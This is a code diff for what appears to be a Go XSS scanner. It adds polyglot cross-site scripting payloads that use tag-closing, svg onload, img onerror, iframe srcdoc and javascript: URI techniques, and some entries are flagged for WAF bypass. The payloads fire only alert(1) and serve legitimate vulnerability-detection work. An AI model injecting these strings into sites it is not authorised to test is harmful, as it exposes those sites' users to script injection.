@@ -50,9 +50,34 @@ var extendedPayloads = map[context.ContextType][]PayloadTemplate{
 		{Value: `<table><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS table-math nesting"},
 		{Value: `<svg><desc><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-desc breakout"},
 		{Value: `<svg><metadata><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-metadata breakout"},
+
+		// Polyglot payloads (dalfox/PortSwigger/OWASP) — execute across multiple
+		// contexts simultaneously; critical for blind/unknown-context scanning.
+		{Value: `javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: dalfox multi-close variant"},
+		{Value: `</script><script>alert(1)</script>`, Severity: model.High, Desc: "Polyglot: script close-reopen"},
+		{Value: `</textarea></script><svg onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: textarea+script close to svg"},
+		{Value: `</style></script><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Polyglot: style+script close to img"},
+		{Value: `</xmp></script><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: xmp+script close"},
+		{Value: `</title></style></textarea></script><img src=x onerror=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: dalfox quad-close"},
+		{Value: `</noscript><svg onload=alert(1)>`, Severity: model.Medium, Desc: "Polyglot: noscript close"},
+		{Value: `--></script><script>alert(1)</script><!--`, Severity: model.High, Desc: "Polyglot: comment-terminator to script"},
+		{Value: `<<script>alert(1)//<script`, Severity: model.High, Desc: "Polyglot: filter-reassembly double open", WAFBypassOnly: true},
+		{Value: `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>"><img src=x onerror=alert(String.fromCharCode(88,83,83))><!--`, Severity: model.Critical, Desc: "Polyglot: OWASP classic XSS polyglot"},
+		{Value: `<iframe srcdoc="<svg onload=alert(1)>">`, Severity: model.High, Desc: "Polyglot: iframe srcdoc svg"},
+		{Value: `<svg><a xlink:href="javascript:alert(1)"><text>X</text></a></svg>`, Severity: model.Medium, Desc: "Polyglot: svg xlink javascript"},
+		{Value: `<svg><set attributeName="href" to="javascript:alert(1)"/>`, Severity: model.Medium, Desc: "Polyglot: svg set href"},
 	},
 
 	context.ContextHTMLAttrValue: {
+		// Polyglot payloads for attribute-value breakout (PortSwigger classics)
+		{Value: `'"><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: triple-quote breakout to svg"},
+		{Value: `"><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Polyglot: double-quote breakout to img"},
+		{Value: `'><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: single-quote breakout to svg"},
+		{Value: `"><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: double-quote breakout to svg"},
+		{Value: `"><img src=x onerror="alert(1)" x="`, Severity: model.High, Desc: "Polyglot: quoted img breakout"},
+		{Value: `%22%3E%3Csvg%20onload=alert(1)%3E`, Severity: model.Medium, Desc: "Polyglot: URL-encoded breakout", WAFBypassOnly: true},
+		{Value: `" autofocus onfocus=alert(1) "`, Severity: model.High, Desc: "Polyglot: autofocus double-quote"},
+
 		// Quote-less breakout (space-separated)
 		{Value: ` autofocus onfocus=alert(1) x=`, Severity: model.High, Desc: "Space breakout (no quotes)"},
 		{Value: `%20autofocus%20onfocus=alert(1)%20`, Severity: model.High, Desc: "URL-encoded space breakout"},
